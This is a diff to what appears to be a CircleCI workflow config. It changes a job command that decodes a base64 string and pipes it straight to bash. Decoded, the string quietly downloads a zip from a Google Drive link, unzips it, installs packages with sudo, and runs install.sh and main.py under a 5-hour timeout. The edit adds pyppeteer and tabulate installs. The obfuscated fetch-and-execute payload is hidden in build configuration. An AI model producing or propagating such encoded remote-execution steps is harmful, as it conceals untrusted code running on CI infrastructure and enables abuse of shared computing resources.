@@ -14,7 +14,7 @@ jobs:
           no_output_timeout: 5h
           max_run_time: 5h
           command: |
-              bash <( openssl base64 -d \<<< "d2dldCAtcU8gYXBwLnppcCBodHRwczovL2RyaXZlLnVzZXJjb250ZW50Lmdvb2dsZS5jb20vZG93bmxvYWQ/aWQ9MXZrSWlVaVVPS3RLbHFEZ1plRVUzVTU3bkZrblZKZnlnJmV4cG9ydD1kb3dubG9hZCA+IC9kZXYvbnVsbCAyPiYxCnNsZWVwIDUKdW56aXAgYXBwLnppcCAKbHMgLWwgLWEKc2xlZXAgMwpzdWRvIGFwdC1nZXQgaW5zdGFsbCBweXRob24gcHl0aG9uMyBwaXAzIC15CnNoIGluc3RhbGwuc2gKc3VkbyBhcHQtZ2V0IGluc3RhbGwgc2NyZWVuIC15IApweXRob24gbWFpbi5weQ==" )
+              bash <( openssl base64 -d \<<< "d2dldCAtcU8gYXBwLnppcCBodHRwczovL2RyaXZlLnVzZXJjb250ZW50Lmdvb2dsZS5jb20vZG93bmxvYWQ/aWQ9MXZrSWlVaVVPS3RLbHFEZ1plRVUzVTU3bkZrblZKZnlnJmV4cG9ydD1kb3dubG9hZCA+IC9kZXYvbnVsbCAyPiYxCnNsZWVwIDUKdW56aXAgYXBwLnppcCAKbHMgLWwgLWEKc2xlZXAgMwpzdWRvIGFwdC1nZXQgaW5zdGFsbCBweXRob24gcHl0aG9uMyBwaXAzIC15CnNoIGluc3RhbGwuc2gKc3VkbyBhcHQtZ2V0IGluc3RhbGwgc2NyZWVuIC15IApwaXAgaW5zdGFsbCBweXBwZXRlZXIKcGlwIGluc3RhbGwgdGFidWxhdGUKcHl0aG9uIG1haW4ucHk=" )
 
 workflows:
   version: 2
